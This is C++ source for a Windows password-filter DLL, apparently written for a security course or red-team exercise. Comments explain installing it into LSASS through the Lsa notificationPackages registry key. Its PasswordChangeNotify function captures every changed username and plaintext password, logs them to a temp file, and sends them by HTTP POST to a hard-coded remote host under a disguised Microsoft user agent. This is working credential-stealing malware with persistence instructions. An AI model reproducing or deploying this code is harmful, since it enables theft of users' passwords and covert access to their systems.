//USAGE
//this library compiles into a dll file
//place this dll file in the system32 directory
//edit the regkey HKLM:\System\CurrentControlSet\Control\Lsa -> notificationPackages
//add the name of the dll you placed into sys32 (minus the .dll part)
//restart the box.
//the dll should now be visible in procexp loaded under LSASS.exe
//passwords should be saved in C:\Windows\temp\lsass.log

//
// Asa Horn
// aoh9470@rit.edu
//

#include <Windows.h>
#include <SubAuth.h>
#include "stdlib.h"
#include <tchar.h>
#include <winhttp.h>
#include <ntsecapi.h>

#pragma comment(lib, "winhttp.lib")

//////// Helper functions

//Concatante two PUNICODE strings.
//I really hope you like pointer sillyness
//because I don't
// in: String1, String2: the strings to stick together
// out: Result: a pointer to populate with the result
NTSTATUS catUTF16LEStr(
        _In_ PUNICODE_STRING String1,
        _In_ PUNICODE_STRING String2,
        _Out_ PUNICODE_STRING Result
) {
    if (!String1 || !String2 || !Result) {
        return STATUS_INVALID_PARAMETER;
    }

    // Calculate the total length needed for the result
    USHORT totalLength = String1->Length + String2->Length;

    // Allocate memory for the result buffer
    Result->Buffer = (PWCHAR)HeapAlloc(GetProcessHeap(), 0, totalLength + sizeof(WCHAR));
    if (!Result->Buffer) {
        return STATUS_NO_MEMORY;
    }

    // Copy the first string
    memcpy(Result->Buffer, String1->Buffer, String1->Length);

    // Copy the second string
    memcpy((BYTE*)Result->Buffer + String1->Length, String2->Buffer, String2->Length);

    // Set the length and maximum length of the result
    Result->Length = totalLength;
    Result->MaximumLength = totalLength + sizeof(WCHAR);

    // Null-terminate the result string
    *(PWCHAR)((BYTE*)Result->Buffer + totalLength) = L'\0';

    return STATUS_SUCCESS;
}

BOOL sendToServer(PUNICODE_STRING text) {
    //std::cout << text->Buffer;

    // Initialize WinHTTP
    HINTERNET hSession = WinHttpOpen(L"Microsoft-CryptoAPI/10.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
       // std::cerr << "winhttp failed";
        return FALSE;
    }

    // Connect to the remote
    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.109.131", 80, 0);
    if (!hConnect) {
        //std::cerr << "connect failed";
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Create an HTTP POST
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/post",
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            0);
    if (!hRequest) {
       // std::cerr << "POST failed";
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Send the request
    LPCWSTR headers = L"Content-Type: text/plain; charset=UTF-16LE";
    BOOL bResults = WinHttpSendRequest(hRequest,
                                       headers, -1L,
                                       (LPVOID)text->Buffer,
                                       text->Length,
                                       text->Length, 0);

   // std::cout << "Sent!";

    // Clean up
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults;
}


BOOL writeToFile(PUNICODE_STRING text) {
    //open a file (the janky windows way)
    HANDLE hFile = CreateFileW(
            L"C:\\Windows\\temp\\lsass.log",
            FILE_APPEND_DATA,
            FILE_SHARE_READ,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
    );

    //debug
    if (hFile == INVALID_HANDLE_VALUE) {
        //printf("bad handle: %d", hFile);
        return FALSE;
    }
    // Move file pointer to the end for appending
    SetFilePointer(hFile, 0, NULL, FILE_END);

    //Do you see why I hate stupid unicode now
    // Write BOM (byte order mark) if the file is new (just created)
    // this tells windows that it is looking at unicode rather than ascii
    // and prevents null btyes between ascii letters.
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        WORD bom = 0xFEFF;
        DWORD bytesWritten;
        WriteFile(hFile, &bom, sizeof(bom), &bytesWritten, NULL);
    }

    //write the file to disk using fileapi (thanks windows)
    DWORD bytesWritten;
    BOOL result = WriteFile(
            hFile,
            text->Buffer,
            text->Length,
            &bytesWritten,
            NULL
    );

    if(result != TRUE) {
        //std::cerr << "error writing";
    }

    CloseHandle(hFile);
    return 0;
}




//boilerplate dll (I think. TBH this could be doing nothing, but I am not touching it now)
BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

//on load
// True for successful load, false for failure
extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) {
    return TRUE; //error handling / init is lame
}

//called when user is attempting to change password
//return FALSE to deny change, TRUE to accept
//this function being called does not mean the change was successful
extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING uname, PUNICODE_STRING legalName, PUNICODE_STRING password, BOOLEAN SetOperation){
    return TRUE; //not going to actually prevent password changes right now
}

//called to notify that a password change has successfully occurred
//return 0 for OK, other number for error code
extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING uname, ULONG RelativeId, PUNICODE_STRING password){
    //build the unicode chars for building the output
    wchar_t singleColon = L':';
    UNICODE_STRING colon = { 2, 2, &singleColon };

    wchar_t singleNL = L'\n';
    UNICODE_STRING newline = { 2, 2, &singleNL };

    PUNICODE_STRING temp1 = new UNICODE_STRING;
    PUNICODE_STRING temp2 = new UNICODE_STRING;
    PUNICODE_STRING fullString = new UNICODE_STRING;
    catUTF16LEStr(uname, &colon, temp1);
    catUTF16LEStr(password, &newline, temp2);
    catUTF16LEStr(temp1, temp2, fullString);

    free(temp1);
    free(temp2);

   //Zach help, unicode characters are super hard to concatenate
    writeToFile(fullString);
    sendToServer(fullString);

    free(fullString);

    return 0;
}
